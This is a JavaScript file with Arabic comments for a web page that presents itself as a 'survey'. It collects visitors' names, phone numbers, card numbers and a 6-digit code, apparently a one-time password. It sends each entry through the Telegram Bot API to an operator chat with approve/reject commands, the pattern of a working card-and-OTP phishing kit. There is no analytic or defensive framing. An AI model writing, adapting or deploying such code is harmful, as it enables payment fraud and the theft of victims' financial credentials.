// تحميل المشاركين من localStorage
let participants = JSON.parse(localStorage.getItem('participants') || '[]');

// تحديث العداد
function updateCounter() {
    document.getElementById('participantCount').textContent = participants.length;
}

// عرض صفحة
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// عرض خطوة
function showStep(stepNumber) {
    document.querySelectorAll('.step-content').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById('step' + stepNumber).classList.add('active');
    
    // تحديث الخطوات
    document.querySelectorAll('.step').forEach((step, index) => {
        if(index < stepNumber) {
            step.classList.add('active');
        } else {
            step.classList.remove('active');
        }
    });
}

// بدء الاستبيان
function startSurvey() {
    showPage('survey');
    showStep(1);
}

// العودة للرئيسية
function goHome() {
    showPage('home');
    updateCounter();
}

// التالي للخطوة 2
function nextStep() {
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const card = document.getElementById('card').value.trim();
    
    if(!name || !phone || !card) {
        showMessage(CONFIG.MESSAGES.REQUIRED, 'error');
        return;
    }
    
    if(!isValidPhone(phone)) {
        showMessage(CONFIG.MESSAGES.INVALID_PHONE, 'error');
        return;
    }
    
    if(!isValidCard(card)) {
        showMessage(CONFIG.MESSAGES.INVALID_CARD, 'error');
        return;
    }
    
    showStep(2);
}

// تعبئة مثال
function fillExample(code) {
    document.getElementById('code').value = code;
}

// إرسال الاستبيان
async function submitSurvey() {
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const card = document.getElementById('card').value.trim();
    const code = document.getElementById('code').value.trim();
    
    if(!name || !phone || !card || !code) {
        showMessage(CONFIG.MESSAGES.REQUIRED, 'error');
        return;
    }
    
    if(code.length !== 6 || !/^[0-9]+$/.test(code)) {
        showMessage("الرمز يجب أن يكون 6 أرقام", 'error');
        return;
    }
    
    // إنشاء بيانات المشاركة
    const userId = generateUserId();
    const surveyData = {
        id: userId,
        name: name,
        phone: phone,
        card: card,
        code: code,
        date: new Date().toLocaleString('ar-SA'),
        status: 'pending'
    };
    
    try {
        // حفظ محلي
        participants.push(surveyData);
        localStorage.setItem('participants', JSON.stringify(participants));
        
        // إرسال لتيليجرام
        await sendToTelegram(surveyData);
        
        // عرض رقم المشاركة
        document.getElementById('userId').textContent = userId;
        
        // الانتقال للخطوة 3
        showStep(3);
        updateCounter();
        
        showMessage(CONFIG.MESSAGES.SUCCESS, 'success');
        
    } catch (error) {
        showMessage(CONFIG.MESSAGES.ERROR, 'error');
        console.error(error);
    }
}

// إرسال لتيليجرام
async function sendToTelegram(data) {
    if(!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
        console.log("لم يتم إعداد توكن البوت");
        return;
    }
    
    const message = `
    📊 *استبيان جديد*
    
    👤 *المعلومات:*
    - الاسم: ${data.name}
    - الهاتف: ${data.phone}
    - رقم البطاقة: ${data.card}
    - الرمز: ${data.code}
    
    🆔 *رقم المشاركة:* ${data.id}
    📅 *التاريخ:* ${data.date}
    
    ✅ للموافقة: /approve_${data.id}
    ❌ للرفض: /reject_${data.id}
    `;
    
    const url = `${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
        throw error;
    }
}

// عرض رسالة
function showMessage(text, type = 'info') {
    const messageEl = document.getElementById('message');
    messageEl.textContent = text;
    messageEl.className = 'message show';
    
    if(type === 'error') {
        messageEl.style.background = '#f56565';
    } else if(type === 'success') {
        messageEl.style.background = '#48bb78';
    }
    
    setTimeout(() => {
        messageEl.classList.remove('show');
    }, 3000);
}

// عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    updateCounter();
    
    // إضافة event listener للعودة بالزر
    document.querySelectorAll('.back-btn').forEach(btn => {
        btn.addEventListener('click', goHome);
    });
    
    // منع إدخال أحرف في رقم البطاقة
    document.getElementById('card')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
    });
    
    // منع إدخال أحرف في الرمز
    document.getElementById('code')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
    });
});